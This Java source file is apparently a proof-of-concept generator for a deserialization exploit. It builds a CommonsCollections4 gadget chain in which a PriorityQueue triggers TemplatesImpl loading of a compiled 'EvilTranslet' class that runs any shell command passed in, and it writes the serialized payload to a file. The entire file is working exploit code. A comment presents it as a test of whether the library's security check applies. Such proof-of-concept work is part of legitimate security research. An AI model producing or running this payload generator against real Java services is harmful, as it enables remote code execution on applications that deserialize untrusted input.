import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.Comparator;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.Transformer;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/**
 * Generates CommonsCollections4 gadget chain payload for CVE-2025-66524 PoC.
 *
 * Chain: PriorityQueue.readObject()
 *   → TransformingComparator.compare()
 *     → InvokerTransformer.transform("newTransformer")
 *       → TemplatesImpl.newTransformer()
 *         → Runtime.exec(command)
 *
 * NOTE: commons-collections4 >= 4.1 blocks InvokerTransformer deserialization
 * unless system property org.apache.commons.collections4.enableUnsafeSerialization=true.
 * This payload is generated to TEST whether the security check applies.
 */
public class CC4PayloadGenerator {

    /**
     * Minimal bytecode for a class that extends AbstractTranslet and executes a command.
     * Generated using ASM or javac and embedded as raw bytes.
     */
    static byte[] generateEvilBytecode(String command) throws Exception {
        // We'll use javassist-like approach: create bytecode at runtime
        // For simplicity, use a pre-compiled template with command substitution

        // Actually, let's use the Runtime.exec approach with a simpler class
        // We need a class that extends AbstractTranslet, so let's create one using javax.tools

        String className = "EvilTranslet";
        String source = "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "public class " + className + " extends AbstractTranslet {\n" +
            "  static {\n" +
            "    try {\n" +
            "      Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", \"" + command.replace("\"", "\\\"") + "\"});\n" +
            "    } catch (Exception e) { }\n" +
            "  }\n" +
            "  public void transform(DOM doc, SerializationHandler[] handlers) throws TransletException { }\n" +
            "  public void transform(DOM doc, DTMAxisIterator iter, SerializationHandler handler) throws TransletException { }\n" +
            "}\n";

        // Compile in memory
        File tmpDir = new File("/tmp/cc4gen");
        tmpDir.mkdirs();
        File srcFile = new File(tmpDir, className + ".java");
        try (PrintWriter pw = new PrintWriter(srcFile)) {
            pw.print(source);
        }

        // Compile
        ProcessBuilder pb = new ProcessBuilder("javac", "--add-exports",
            "java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED",
            "--add-exports",
            "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
            "--add-exports",
            "java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED",
            "--add-exports",
            "java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED",
            "-d", tmpDir.getAbsolutePath(),
            srcFile.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        String output = new String(p.getInputStream().readAllBytes());
        int rc = p.waitFor();
        if (rc != 0) {
            throw new RuntimeException("Compilation failed: " + output);
        }

        // Read compiled class
        File classFile = new File(tmpDir, className + ".class");
        byte[] bytecode = java.nio.file.Files.readAllBytes(classFile.toPath());
        return bytecode;
    }

    static void setField(Object obj, String fieldName, Object value) throws Exception {
        Class<?> cls = obj.getClass();
        while (cls != null) {
            try {
                Field f = cls.getDeclaredField(fieldName);
                f.setAccessible(true);
                f.set(obj, value);
                return;
            } catch (NoSuchFieldException e) {
                cls = cls.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    public static byte[] generateCC4(String command) throws Exception {
        // Step 1: Create evil TemplatesImpl
        byte[] bytecode = generateEvilBytecode(command);

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][] { bytecode });
        setField(templates, "_name", "Pwned");
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        // Step 2: Create InvokerTransformer that calls newTransformer()
        InvokerTransformer invoker = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);

        // Step 3: Create TransformingComparator
        TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));

        // Step 4: Create PriorityQueue
        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add(1);
        queue.add(1);

        // Step 5: Replace comparator's transformer with our InvokerTransformer
        setField(comparator, "transformer", invoker);

        // Step 6: Replace queue elements with TemplatesImpl
        Object[] queueArray = (Object[]) getField(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        // Serialize
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();

        return baos.toByteArray();
    }

    static Object getField(Object obj, String fieldName) throws Exception {
        Class<?> cls = obj.getClass();
        while (cls != null) {
            try {
                Field f = cls.getDeclaredField(fieldName);
                f.setAccessible(true);
                return f.get(obj);
            } catch (NoSuchFieldException e) {
                cls = cls.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println("Usage: CC4PayloadGenerator <command> <outfile>");
            System.exit(1);
        }

        String command = args[0];
        String outFile = args[1];

        System.out.println("[*] Generating CC4 payload for command: " + command);

        try {
            byte[] payload = generateCC4(command);

            try (FileOutputStream fos = new FileOutputStream(outFile)) {
                fos.write(payload);
            }

            System.out.println("[+] Generated CC4 payload: " + payload.length + " bytes");
            System.out.print("[+] First 32 bytes (hex): ");
            for (int i = 0; i < Math.min(32, payload.length); i++) {
                System.out.printf("%02x", payload[i] & 0xFF);
            }
            System.out.println();
            System.out.println("[+] Written to: " + outFile);
        } catch (Exception e) {
            System.err.println("[-] CC4 payload generation failed: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
        }
    }
}
